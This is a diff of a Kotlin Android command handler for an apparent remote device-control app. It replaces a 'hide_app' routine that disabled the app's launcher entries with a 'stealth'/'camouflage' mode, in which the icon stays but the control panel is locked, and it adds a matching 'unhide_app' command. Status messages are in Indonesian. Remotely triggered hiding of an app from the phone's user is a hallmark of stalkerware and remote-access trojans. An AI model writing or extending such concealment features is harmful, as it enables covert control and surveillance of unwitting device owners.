@@ -702,25 +702,31 @@ class CommandHandler(private val context: Context) : TextToSpeech.OnInitListener
                 }
                 "hide_app" -> {
                     try {
-                        val packageManager = context.packageManager
+                        val prefs = context.getSharedPreferences("config", Context.MODE_PRIVATE)
+                        prefs.edit().putBoolean("stealth_mode", true).apply()
                         
-                        // Disable Alias
-                        packageManager.setComponentEnabledSetting(
-                            android.content.ComponentName(context, "com.example.devicecontrol.LauncherAlias"),
-                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                            android.content.pm.PackageManager.DONT_KILL_APP
-                        )
+                        // Pastikan komponen tetap ENABLE agar icon tidak berubah jadi App Info
+                        val pm = context.packageManager
+                        val alias = android.content.ComponentName(context, "com.example.devicecontrol.LauncherAlias")
+                        pm.setComponentEnabledSetting(alias, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP)
                         
-                        // Disable Main Component
-                        packageManager.setComponentEnabledSetting(
-                            android.content.ComponentName(context, MainActivity::class.java),
-                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                            android.content.pm.PackageManager.DONT_KILL_APP
-                        )
-                        
-                        sendResponse(createResponse(cmdId, "hide_app", "Aplikasi berhasil disembunyikan dari laci utama (Stealth Mode Aktif)"))
+                        sendResponse(createResponse(cmdId, "hide_app", "Mode Kamuflase Aktif: Ikon tetap ada tapi Control Panel terkunci."))
                     } catch (e: Exception) {
-                        sendResponse(createResponse(cmdId, "error", "Gagal menyembunyikan ikon: ${e.message}"))
+                        sendResponse(createResponse(cmdId, "error", "Gagal menyembunyikan: ${e.message}"))
+                    }
+                }
+                "unhide_app" -> {
+                    try {
+                        val prefs = context.getSharedPreferences("config", Context.MODE_PRIVATE)
+                        prefs.edit().putBoolean("stealth_mode", false).apply()
+                        
+                        val pm = context.packageManager
+                        val alias = android.content.ComponentName(context, "com.example.devicecontrol.LauncherAlias")
+                        pm.setComponentEnabledSetting(alias, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, 0)
+                        
+                        sendResponse(createResponse(cmdId, "unhide_app", "Control Panel berhasil dimunculkan kembali!"))
+                    } catch (e: Exception) {
+                        sendResponse(createResponse(cmdId, "error", "Gagal memunculkan panel: ${e.message}"))
                     }
                 }
                 else -> {
